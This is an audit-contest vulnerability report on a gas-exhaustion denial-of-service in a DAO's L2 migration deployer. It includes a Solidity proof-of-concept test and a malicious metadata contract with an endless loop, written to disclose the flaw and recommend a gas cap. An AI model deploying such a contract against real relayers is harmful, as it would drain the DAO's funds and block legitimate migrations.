Cold Blonde Sparrow

high

# A malicious actor may send multiple calls to the `L2MigrationDeployer::callMetadataRenderer()` function to deplete all available gas for legitimate `L2MigrationDeployer` transactions

## Summary

A malicious actor could deploy a DAO on `L2` using a `malicious metadata contract`. Subsequently, they could send several calls to the `L2MigrationDeployer::callMetadataRenderer()` function, consuming all the available gas for `L2MigrationDeployer transactions`, making the protocol owner to purchase additional gas using funds from the `BuilderDAO` funds.

## Vulnerability Detail


A new functionality is introduced to facilitate deployment of a DAO from `L1` to `L2` using the [L2MigrationDeployer](https://github.com/sherlock-audit/2023-09-nounsbuilder/blob/main/nouns-protocol/src/deployers/L2MigrationDeployer.sol) contract. The steps to achieve this are as follows:

1. `L1` DAO pauses the auctions.
2. Offchain, a merkle root of the `L1` DAO holders is generated, query the DAO's current settings and add in the `L2MigrationDeployer` contract deployer as the first founder with zero allocation in order to be able to configure the [MerkleReserveMinter](https://github.com/sherlock-audit/2023-09-nounsbuilder/blob/main/nouns-protocol/src/deployers/L2MigrationDeployer.sol#L114)
3. A proposal is created on `L1` DAO to call the [L2MigrationDeployer::deploy()](https://github.com/sherlock-audit/2023-09-nounsbuilder/blob/main/nouns-protocol/src/deployers/L2MigrationDeployer.sol#L92) function, the [L2MigrationDeployer::callMetadataRenderer()](https://github.com/sherlock-audit/2023-09-nounsbuilder/blob/main/nouns-protocol/src/deployers/L2MigrationDeployer.sol#L142C14-L142C34) function and [L2MigrationDeployer::renounceOwnership](https://github.com/sherlock-audit/2023-09-nounsbuilder/blob/main/nouns-protocol/src/deployers/L2MigrationDeployer.sol#L168) function.
4. Now tokens can be claimed by users on `L2`.
5. `L1` DAO can send treasury funds to `L2` treasury using the [L2MigrationDeployer::depositToTreasury()](https://github.com/sherlock-audit/2023-09-nounsbuilder/blob/main/nouns-protocol/src/deployers/L2MigrationDeployer.sol#L155C14-L155C31) function.

However, a user could deploy a DAO on `L2` using a malicious metadata contract. This contract could endlessly loop, consuming all available gas when called using the [L2MigrationDeployer::callMetadataRenderer()](https://github.com/sherlock-audit/2023-09-nounsbuilder/blob/main/nouns-protocol/src/deployers/L2MigrationDeployer.sol#L146) function:

```solidity
File: L2MigrationDeployer.sol
142:     function callMetadataRenderer(bytes memory _data) external {
143:         (, address metadata, , , ) = _getDAOAddressesFromSender();
144: 
145:         // Call the metadata renderer
146:         (bool success, ) = metadata.call(_data);
147: 
148:         // Revert if metadata call fails
149:         if (!success) {
150:             revert METADATA_CALL_FAILED();
151:         }
152:     }
```

The [documentation](https://github.com/sherlock-audit/2023-09-nounsbuilder-0xbepresent/tree/main#q-are-there-any-off-chain-mechanisms-or-off-chain-procedures-for-the-protocol-keeper-bots-input-validation-expectations-etc) states: *L2MigrationDeployer transactions can reach above the max purchased gas for L1CrossDomainMessenger relayMessage calls. These transactions will be resubmitted by our relayer.*. Once the purchased gas has run out, the `L2MigrationDeployer` transactions will be resubmitted by the relayer (offchain bot) and the gas is bought by `BuilderDAO` as the next conversation to the sponsor suggest:

```text
0xbepresent — Today at 1:43 PM
Hi @Neokry I'm participating in the Sherlock contest. I have a question: When the message is sent from L1 to L2 to send dao's treasury funds who pay for the gas transaction?. In the contest readme says: "L2MigrationDeployer transactions can reach above the max purchased gas for L1CrossDomainMessenger relayMessage calls. ", who pays for the "purchased gas"?.

Neokry — Today at 1:53 PM
so sending the treasury funds will be after the migration steps and that call should succeed since it wont be sending any data
but for the other calls we will be using the bot that will recieve funds from BuilderDAO to execute these transactions. we think of it as a customer aquasition cost in return for recieving protocol rewards 
```

Please consider the following scenario:

1. A malicious actor deploys a DAO on `L2` using a `malicious metadata contract` that will endlessly loop until it had consumed all the available gas in a specific funcion E.g. `MaliciousRenderContract::spendAllGas()` function. 
2. The `MaliciousRenderContract::spendAllGas()` is called using the [L2MigrationDeployer::callMetadataRenderer()](https://github.com/sherlock-audit/2023-09-nounsbuilder/blob/main/nouns-protocol/src/deployers/L2MigrationDeployer.sol#L142C14-L142C34) function on `L2` and `MaliciousRenderContract::spendAllGas()` reverts the transaction in order to the relayer to resubmit.
3. The `relayer` resubmits the transaction and the `malicious metadata contract` [consumes all the available gas](https://github.com/sherlock-audit/2023-09-nounsbuilder/blob/main/nouns-protocol/src/deployers/L2MigrationDeployer.sol#L146) because the `MaliciousRenderContract::spendAllGas()` has an infinite loop.
4. The malicious actor floods the system with multiple calls, depleting the purchased gas for `L1CrossDomainMessenger relayMessage calls`.
5. In order to process other legitimate `L2MigrationDeployer transactions`, the `BuilderDAO` must purchase more gas.

## Impact

A malicious actor could deploy a malicious DAO on `L2` and force the protocol to buy more gas from the `BuilderDAO` funds in order to process other legitimate `L2MigrationDeployer transactions`.

I created a test where the malicious actor deploys on `L2` using a `malicious metadata contract` which will be reverted by out of gas error. Test steps:

1. Deploy the `malicious metadata renderer` contract.
2. Deploy the DAO on `L2`.
3. Call `MaliciousMetaData::spendAllGas()` function using the `L2MigrationDeployer::callMetadataRenderer()`. The `spendAllGas()` function will be reverted by a `OutOfGas` error therfore the `callMetadataRenderer()` will be reverted.

```solidity
// File: L2MigrationDeployer.t.sol
// forge test --match-test "test_MaliciousMetadata" --gas-limit 92333222 -vvv
//
import { MaliciousMetaData } from "./MaliciousMetaData.sol";
...
...
    function test_MaliciousMetadata() external {
        //
        // 1. Deploy our malicious metadata renderer
        MaliciousMetaData mm = new MaliciousMetaData();
        //
        // 2. Deploy the DAO on 'L2'
        setAltMockFounderParams();
        setMockTokenParamsWithRenderer(address(mm));
        setMockAuctionParams();
        setMockGovParams();
        setMinterParams();
        vm.startPrank(address(xDomainMessenger));
        address _token = deployer.deploy(foundersArr, tokenParams, auctionParams, govParams, minterParams);
        addMetadataProperties();
        deployer.renounceOwnership();
        vm.stopPrank();
        //
        // 3. Call malicious contract `spendAllGas()` function using the `L2MigrationDeployer::callMetadataRenderer()`
        // The `spendAllGas()` function will be reverted by a OutOfGas error therfore the `callMetadataRenderer()` will be reverted.
        bytes memory data = abi.encodeWithSignature("spendAllGas()");
        vm.expectRevert();
        vm.prank(address(xDomainMessenger));
        deployer.callMetadataRenderer(data);
    }
```

The `MaliciousMetaData.sol` contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.16;

contract MaliciousMetaData {

    struct ItemParam {
        uint256 propertyId;
        string name;
        bool isNewProperty;
    }

    struct IPFSGroup {
        string baseUri;
        string extension;
    }

    function initialize(bytes calldata initStrings, address token) external pure returns (bool) {
        return true;
    }

    function addProperties(
        string[] calldata _names,
        ItemParam[] calldata _items,
        IPFSGroup calldata _ipfsGroup
    ) external pure returns (bool) {
        return true;
    }

    function spendAllGas() external pure returns (bool) {
        uint256 i = 0;
        while (true == true) {
            i += i * 30;
        }
        return true;
    }
}
```

## Code Snippet

- [L2MigrationDeployer::callMetadataRenderer()](https://github.com/sherlock-audit/2023-09-nounsbuilder/blob/main/nouns-protocol/src/deployers/L2MigrationDeployer.sol#L142C14-L142C34)


## Tool used

Manual review

## Recommendation

Implement a gas limit for [the call](https://github.com/sherlock-audit/2023-09-nounsbuilder/blob/main/nouns-protocol/src/deployers/L2MigrationDeployer.sol#L146).